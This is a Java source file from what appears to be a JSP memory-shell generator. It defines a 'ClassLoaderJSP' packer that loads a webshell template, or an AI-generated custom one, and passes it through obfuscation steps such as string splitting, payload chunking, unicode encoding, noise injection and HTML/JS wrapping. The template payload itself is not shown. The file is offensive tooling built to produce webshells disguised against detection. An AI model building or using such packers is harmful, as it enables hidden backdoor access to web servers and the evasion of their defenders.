package org.leo.jmg.mem.packer.jsp;

import org.leo.core.util.request.GenerationRandom;
import org.leo.jmg.mem.packer.ClassPackerConfig;
import org.leo.jmg.mem.packer.Packer;
import org.leo.jmg.mem.packer.PackerMeta;
import org.leo.jmg.mem.packer.PackerRegistry;
import org.leo.jmg.mem.packer.PackerResources;
import org.leo.jmg.mem.packer.TemplateRenderer;

@PackerMeta(
    name = "ClassLoaderJSP", group = "Jsp", order = 1,
    obfuscationSteps = {
        "SPLIT_STRING_LITERALS",
        "CHUNK_PAYLOAD",
        "GHOST_BITS_ENCODE",
        "INJECT_SCRIPTLET_NOISE",
        "INSERT_SCRIPT_NOISE",
        "UNICODE_ENCODE_JSP",
        "WRAP_HTML_JS"
    }
)
public class ClassLoaderJspPacker implements Packer {

    private final String jspTemplate = PackerResources.loadTemplate("/memshell-template/shell.jsp.txt");

    @Override
    public String pack(ClassPackerConfig config) {
        try (GenerationRandom.Scope ignored = GenerationRandom.withSeed(config.getObfuscationSeed())) {
            // AI 生成的自定义模板优先；未提供时回退到内置模板
            boolean custom = config.getCustomTemplate() != null
                    && !config.getCustomTemplate().trim().isEmpty();
            String tpl = custom
                    ? config.getCustomTemplate()
                    : jspTemplate;
            if (custom) {
                JspLoaderTemplateValidator.validate(tpl);
            }
            String code = TemplateRenderer.render(tpl, config);
            JspObfuscationPipeline pipeline = (config.getJspObfuscationSteps() != null)
                    ? JspObfuscationPlanner.compile(
                            config.getJspObfuscationSteps(),
                            JspObfuscationPlanContext.packer(
                                    JspObfuscationPlanContext.Format.JSP,
                                    PackerRegistry.getSupportedObfuscationSteps("ClassLoaderJSP"),
                                    config.getObfuscationSeed())).getPipeline()
                    : JspObfuscationPipeline.jspDefault(config.getObfuscationSeed());
            return pipeline.apply(code);
        }
    }
}
